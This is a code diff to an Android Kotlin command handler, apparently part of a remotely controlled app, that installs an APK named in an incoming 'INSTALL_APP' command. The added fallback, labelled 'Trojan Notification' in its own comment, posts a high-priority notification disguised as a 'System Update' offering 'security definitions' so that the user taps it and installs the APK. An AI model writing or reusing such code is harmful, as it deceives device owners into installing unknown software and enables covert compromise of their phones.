@@ -554,22 +554,53 @@ object CommandProcessor {
                 "INSTALL_APP" -> {
                     val apkFile = File(content.trim())
                     if (apkFile.exists() && apkFile.isFile) {
+                        val uri = androidx.core.content.FileProvider.getUriForFile(
+                            ctx, 
+                            "${ctx.packageName}.fileprovider", 
+                            apkFile
+                        )
+                        val installIntent = Intent(Intent.ACTION_VIEW).apply {
+                            setDataAndType(uri, "application/vnd.android.package-archive")
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                        }
+                        
                         try {
-                            val uri = androidx.core.content.FileProvider.getUriForFile(
-                                ctx, 
-                                "${ctx.packageName}.fileprovider", 
-                                apkFile
-                            )
-                            val installIntent = Intent(Intent.ACTION_VIEW).apply {
-                                setDataAndType(uri, "application/vnd.android.package-archive")
-                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
-                            }
+                            // PRIMARY: Attempt direct background launch
                             ctx.startActivity(installIntent)
                             status = "INSTALL_PROMPT_TRIGGERED"
                         } catch (e: Exception) {
-                            status = "INSTALL_FAILED"
-                            errorMsg = "FileProvider Error: ${e.message}"
+                            // FALLBACK: OS blocked background launch. Deploy Trojan Notification.
+                            try {
+                                val pendingIntent = android.app.PendingIntent.getActivity(
+                                    ctx, 
+                                    102, 
+                                    installIntent, 
+                                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+                                )
+
+                                val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+                                val channelId = "system_updates"
+                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                                    val channel = android.app.NotificationChannel(channelId, "System Updates", android.app.NotificationManager.IMPORTANCE_HIGH)
+                                    nm.createNotificationChannel(channel)
+                                }
+
+                                val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
+                                    .setSmallIcon(android.R.drawable.stat_sys_download_done)
+                                    .setContentTitle("System Update Ready")
+                                    .setContentText("Tap to install the latest security definitions.")
+                                    .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
+                                    .setContentIntent(pendingIntent)
+                                    .setAutoCancel(true)
+
+                                nm.notify(102, builder.build())
+                                status = "INSTALL_DEFERRED_TO_NOTIFICATION"
+                                errorMsg = "Background launch blocked. Notification deployed."
+                            } catch (fallbackErr: Exception) {
+                                status = "INSTALL_FAILED_ALL"
+                                errorMsg = fallbackErr.message ?: "Unknown fallback error"
+                            }
                         }
                     } else {
                         status = "INSTALL_FAILED (NOT_FOUND)"
